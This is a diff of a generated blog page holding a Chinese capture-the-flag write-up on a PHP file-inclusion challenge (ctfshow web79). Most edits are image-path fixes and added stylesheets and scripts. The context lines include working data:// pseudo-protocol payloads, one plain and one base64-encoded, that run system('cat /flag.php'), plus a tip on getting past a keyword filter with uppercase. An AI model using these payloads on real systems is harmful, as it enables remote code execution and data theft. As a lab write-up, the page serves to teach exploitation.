@@ -26,15 +26,15 @@
 <meta property="og:site_name" content="Suzen">
 <meta property="og:description" content="题目源码 123456789101112131415161718192021 &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:10:14# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201013175.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201019142.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201021147.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201013175.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201019142.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201021147.png">
 <meta property="article:published_time" content="2025-05-25T01:06:05.000Z">
 <meta property="article:modified_time" content="2026-09-09T12:10:23.156Z">
 <meta property="article:author" content="Suzen">
 <meta property="article:tag" content="文件包含 伪协议">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201013175.png">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201013175.png">
 <meta name="twitter:creator" content="@Suzen">
   
   
@@ -77,6 +77,9 @@
 
   
 <link rel="stylesheet" href="/css/glassbg.css">
+<link rel="stylesheet" href="/css/banner-video.css">
+<link rel="stylesheet" href="/css/hero.css">
+<link rel="stylesheet" href="/css/pages-tweak.css">
 
 
 
@@ -110,7 +113,7 @@
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 
-<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+<body ><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
 
     
 
@@ -269,6 +272,18 @@
           
           
             <li class="nav-item">
+              <a class="nav-link" href="/posts/" target="_self">
+                <i class="iconfont icon-books"></i>
+                <span>文章</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
               <a class="nav-link" href="/archives/" target="_self">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
@@ -327,11 +342,13 @@
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
+        
         <div class="h2">
           
             <span id="subtitle" data-typed-text="ctfshow-web79-文件包含-data伪协议"></span>
           
         </div>
+        
 
         
           
@@ -440,12 +457,12 @@
 <p>可以使用<code>data://</code>伪协议执行命令</p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag.php&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201013175.png" srcset="/img/loading.gif" lazyload alt="image-20260909201013175"></p>
+<p><img src="/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201013175.png" srcset="/img/loading.gif" lazyload alt="image-20260909201013175"></p>
 <p>直接使用没回显，加上base64进行编码</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201019142.png" srcset="/img/loading.gif" lazyload alt="image-20260909201019142"></p>
+<p><img src="/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201019142.png" srcset="/img/loading.gif" lazyload alt="image-20260909201019142"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcucGhwJyk7Pz4=<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201021147.png" srcset="/img/loading.gif" lazyload alt="image-20260909201021147"></p>
+<p><img src="/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20260909201021147.png" srcset="/img/loading.gif" lazyload alt="image-20260909201021147"></p>
 <p>也可以使用大写绕过对<code>php</code>的过滤，但是可能会不知道<code>flag</code>的文件名，而且<code>flag.php</code>也有<code>php</code>不好绕过</p>
 
                 
@@ -945,6 +962,11 @@
   <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
+
+
+  
+<script src="/js/banner-video.js"></script>
+<script src="/js/quote.js"></script>
 
 
 
